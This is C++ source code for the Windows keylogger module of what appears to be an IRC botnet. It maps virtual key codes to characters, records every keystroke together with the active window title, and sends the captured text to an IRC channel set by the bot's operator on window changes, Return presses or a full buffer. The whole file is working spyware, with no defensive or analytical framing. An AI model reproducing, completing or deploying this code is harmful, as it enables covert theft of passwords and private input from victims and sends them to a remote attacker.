#ifdef WIN32

#include "main.h"
#include "cthread.h"
#include "mainctrl.h"
#include "keylogger.h"

//dont change this its for the keylogger and the sendkeys function
int inputL[]={
	8,
	13,
	27,
	112,
	113,
	114,
	115,
	116,
	117,
	118,
	119,
	120,
	121,
	122,
	123,
	192,
	49,
	50,
	51,
	52,
	53,
	54,
	55,
	56,
	57,
	48,
	189,
	187,
	9,
	81,
	87,
	69,
	82,
	84,
	89,
	85,
	73,
	79,
	80,
	219,
	221,
	65,
	83,
	68,
	70,
	71,
	72,
	74,
	75,
	76,
	186,
	222,
	90,
	88,
	67,
	86,
	66,
	78,
	77,
	188,
	190,
	191,
	220,
	17,
	91,
	32,
	92,
	44,
	145,
	45,
	36,
	33,
	46,
	35,
	34,
	37,
	38,
	39,
	40,
	144,
	111,
	106,
	109,
	107,
	96,
	97,
	98,
	99,
	100,
	101,
	102,
	103,
	104,
	105,
	110,
};

char *outputL[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"`",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[TAB]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"\\",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
}; 




char *outputH[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"~",
	"!",
	"@",
	"#",
	"$",
	"%",
	"^",
	"&",
	"*",
	"(",
	")",
	"_",
	"+",
	"[TAB]",
	"Q",
	"W",
	"E",
	"R",
	"T",
	"Y",
	"U",
	"I",
	"O",
	"P",
	"{",
	"}",
	"A",
	"S",
	"D",
	"F",
	"G",
	"H",
	"J",
	"K",
	"L",
	":",
	"\"",
	"Z",
	"X",
	"C",
	"V",
	"B",
	"N",
	"M",
	"<",
	">",
	".?",//strange ?? dont know why but only a ? did not work
	"|",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
};

CKeyLog::CKeyLog() { m_szType="CKeyLog"; }
CKeyLog::~CKeyLog() { }
void *CKeyLog::Run() {
	HWND win, winold;
	int bKstate[256]={0};
    int i,x;

	char buffer[600];
	char buffer2[800];
	char window[61];
	int state;
	int shift;

	memset(buffer,0,sizeof(buffer));
	win = GetForegroundWindow();
	winold = win;
	GetWindowText(winold,window,60);

	while(g_pMainCtrl->m_bRunning)
	{
		while(!g_pMainCtrl->m_cBot.keylog_enabled.bValue) Sleep(1000);
		Sleep(8); // try not to use all the cpu
		win = GetForegroundWindow();
		if (win != winold) {
			if (strlen(buffer) != 0) {
				sprintf(buffer2,"%s (Changed window)",buffer);
				g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.keylog_channel.sValue.Str(),
					"(%s)  %s\n", window, buffer2);
				//err = sendkeys(keysock,buffer2,window,logfile);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
			win = GetForegroundWindow();
			winold = win;
			GetWindowText(winold,window,60);

		}
		for(i=0;i<92;i++)
		{
			shift = GetKeyState(VK_SHIFT);
 			x = inputL[i];
			if (GetAsyncKeyState(x) & 0x8000) {
				//see if capslock or shift is pressed doesnt work most of the time on win9x
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1;//upercase a-z
				else if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2;//lowercase a-z
				else if (shift < 0) //Shift
					bKstate[x] = 3; //upercase
				else bKstate[x] = 4; //lowercase 
			}

			else {
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) {
						buffer[strlen(buffer)-1] = 0;
						continue;
					}
					else if (strlen(buffer) > 550) {
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (Buffer full)",buffer);
						g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.keylog_channel.sValue.Str(),
							"(%s)  %s\n", window, buffer2);
						//err = sendkeys(keysock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (x == 13)  {
						if (strlen(buffer) == 0) continue;
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (Return)",buffer);
						g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.keylog_channel.sValue.Str(),
							"(%s)  %s\n", window, buffer2);
						//err = sendkeys(keysock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (state == 1 || state == 3)
						strcat(buffer,outputH[i]);
					else if (state == 2 || state == 4)
						strcat(buffer,outputL[i]);
				}

     			}
		}
	}
	return NULL;
}
#endif